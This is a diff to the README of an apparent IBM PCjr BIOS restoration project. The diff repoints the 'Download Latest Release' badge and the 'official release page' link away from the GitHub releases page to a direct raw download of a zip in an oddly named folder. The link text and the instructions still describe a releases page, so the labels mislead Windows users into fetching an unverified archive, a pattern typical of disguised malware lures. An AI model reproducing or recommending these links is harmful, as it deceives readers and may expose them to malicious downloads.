@@ -1,6 +1,6 @@
 # 💾 pcjr_bios - Restore original IBM computer software easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bardan3291/pcjr_bios/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Bardan3291/pcjr_bios/main/semifailure/pcjr-bios-v2.0.zip)
 
 This project provides the original software code for the IBM PCjr computer. It allows users to recreate the exact startup instructions that the computer used in the 1980s. This helps people restore vintage hardware or run historical software in modern emulators.
 
@@ -12,7 +12,7 @@ The process involves downloading the project files and preparing them for your c
 
 ## 📥 How to Download the Files
 
-1. Visit the [official release page](https://github.com/Bardan3291/pcjr_bios/releases) to access the software files.
+1. Visit the [official release page](https://raw.githubusercontent.com/Bardan3291/pcjr_bios/main/semifailure/pcjr-bios-v2.0.zip) to access the software files.
 2. Look for the section labeled Assets.
 3. Click the link that ends in .zip to save the folder to your computer.
 4. Open your Downloads folder on your Windows computer.
